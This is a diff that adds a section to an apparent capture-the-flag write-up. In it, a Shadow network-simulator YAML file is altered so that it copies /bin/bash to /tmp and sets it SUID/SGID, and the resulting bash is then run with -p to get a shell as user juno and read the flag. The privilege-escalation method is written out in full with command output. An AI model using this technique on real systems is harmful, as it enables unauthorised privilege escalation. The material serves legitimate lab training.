@@ -401,3 +401,77 @@ hosts:
 ```
 
 <br />
+
+A simple network is simulated with a 1 `Gbit` switch, through which three `clients` access an HTTP `server` hosted with Python on port 80.
+
+## Malicious YAML file:
+
+<br />
+
+To exploit this task, we are going to `modify` the commands being executed so that the user `juno` makes a copy of `/bin/bash` and assigns it SUID privileges.
+
+This way, we can execute this copied bash with `SUID` permissions , allowing us to run a bash shell as juno.
+
+<br />
+
+```yml
+general:
+  # stop after 10 simulated seconds
+  stop_time: 10s
+  # old versions of cURL use a busy loop, so to avoid spinning in this busy
+  # loop indefinitely, we add a system call latency to advance the simulated
+  # time when running non-blocking system calls
+  model_unblocked_syscall_latency: true
+
+network:
+  graph:
+    # use a built-in network graph containing
+    # a single vertex with a bandwidth of 1 Gbit
+    type: 1_gbit_switch
+
+hosts:
+  # a host with the hostname 'server'
+  server:
+    network_node_id: 0
+    processes:
+    - path: /usr/bin/cp
+      args: /bin/bash /tmp/malicious_bash
+      start_time: 3s
+  # three hosts with hostnames 'client1', 'client2', and 'client3'
+  client:
+    network_node_id: 0
+    quantity: 3
+    processes:
+    - path: /usr/bin/chmod
+      args: 6755 /tmp/malicious_bash
+      start_time: 5s
+```
+
+<br />
+
+Go to `/tmp` and execute de malicious bash:
+
+<br />
+
+```bash
+postgres@jupiter:/tmp$ ls -l malicious_bash 
+-rwsr-sr-x 1 juno juno 1396520 Mar 27 19:50 malicious_bash
+postgres@jupiter:/tmp$ ./malicious_bash -p
+malicious_bash-5.1$ whoami
+juno
+```
+
+<br />
+
+And get the `user.txt` flag:
+
+<br />
+
+```bash
+malicious_bash-5.1$ cd /home/juno
+malicious_bash-5.1$ cat user.txt
+e728ef41fc4b13b75da02117e6xxxxxx
+```
+
+<br />
+
